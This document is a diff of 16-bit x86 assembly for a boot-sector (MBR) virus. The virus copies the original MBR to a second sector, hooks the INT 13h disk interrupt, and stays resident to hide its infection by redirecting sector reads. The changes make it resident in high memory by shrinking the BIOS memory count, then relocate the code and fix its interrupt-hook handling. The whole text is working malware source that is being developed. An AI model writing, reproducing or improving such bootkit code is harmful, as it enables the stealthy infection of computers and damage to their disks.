@@ -6,6 +6,7 @@ start:
   cli                         ; no interrupt zone
   mov BYTE [bootDrive], dl    ; save boot drive, this is infected drive
   mov sp, 0xFFF8              ; stack pointer
+  pusha
   xor ax, ax
   mov ds, ax
   mov es, ax
@@ -52,32 +53,46 @@ nxt_disk:
 ; we have to relocate ourselves to 0x7e00, so we don't overwrite when copying
 ; original MBR
 relocate:
+  xor ax, ax
+  mov ds, ax
+  dec word [ds:0x413]
+  dec word [ds:0x413]
+  mov ax, [ds:0x413]
+  shl ax, (10-4)
+  mov es, ax
+  ;sub ax, 0x7c0
   mov dl, [bootDrive]             ; retrieve current boot drive
   mov si, cpy_original            ; source address
-  mov di, 0xF000                  ; destination address, 0xF000 in our case
+  xor di, di
+  ;mov di, 0x500                  ; destination address, 0x500 in our case
   mov cx, end_cpy                 ; load end of code address
   sub cx, cpy_original            ; subtract start of code, cx = code length
   rep movsb                       ; copy stuff from source to dest address
 
-  jmp 0:0xF000                      ; jump to new address
+  push es
+  push word 0x0
+  retf
 
-; this code resides on 0xF000 after copying
+; this code resides on 0x500 after copying
 cpy_original:                   ; this code will copy original MBR to 0x7c00
+  xor ax, ax
+  mov es, ax
   mov ah, 0x02                  ; read sector, ah = 0x02
+  mov al, 0x01
   mov cx, 0x0002                ; read 2nd sector
   mov bx, 0x7c00                ; dest address
   call wr_sector                ; copy orignal MBR
 
   ; before we jump into org mbr, let's hook int 13h
-  mov ax, word [0x13*4]                         ; get old 13h vector (offset)
-  mov bx, word [0x13*4+2]                       ; get old 13h vector (segment)
-  mov [oldint13-cpy_original+0xF000], ax        ; save old interrupt offset
-  mov [oldint13-cpy_original+0xF000+2], bx      ; save old interrupt segment
+  mov ax, word [es:0x13*4]                         ; get old 13h vector (offset)
+  mov bx, word [es:0x13*4+2]                       ; get old 13h vector (segment)
+  mov [cs:oldint13-cpy_original], ax        ; save old interrupt offset
+  mov [cs:oldint13-cpy_original+2], bx      ; save old interrupt segment
   mov ax, dsk_hook
   sub ax, cpy_original
-  add ax, 0xF000                                ; calculate disk hook address
-  mov word [0x13*4], ax
-  mov word [0x13*4+2], 0                        ; save new adress to 13h vector
+  mov word [es:0x13*4], ax
+  mov word [es:0x13*4+2], cs                        ; save new adress to 13h vector
+  popa
   jmp 0x0:0x7c00                                ; far jump to the original MBR
 
 ; disk hook that will resident in memory
@@ -90,15 +105,15 @@ dsk_hook:
   mov cx, 0x0002                                ; change it to original MBR
 .end_hook:
   popf
-  push word [cs:oldint13-cpy_original+0xF000+2] ; push segment
-  push word [cs:oldint13-cpy_original+0xF000]   ; push offset
+  push word [cs:oldint13-cpy_original+2] ; push segment
+  push word [cs:oldint13-cpy_original]   ; push offset
   retf                                          ; call original handler
   sti
   iret
 
 
 oldint13:
-  dd 45                                         ; var for saving int13 address
+  dd 0xDEBEFEAA                                         ; var for saving int13 address
 
 ; write/read sector on disk, based on
 ; ah = 0x02 read, ah = 0x03 write
@@ -110,10 +125,10 @@ wr_sector:
     jnc .endrs                  ; alright carry was not set, read was successful
     dec si                      ; decrement counter
     jc .endrs
-    pusha
+    push ax
     xor ah, ah                  ; ah = 0, reset disk
     int 0x13                    ; reset disk, we have to try this at most 3 times
-    popa
+    pop ax
     jmp .lprs
   .endrs:
     retn
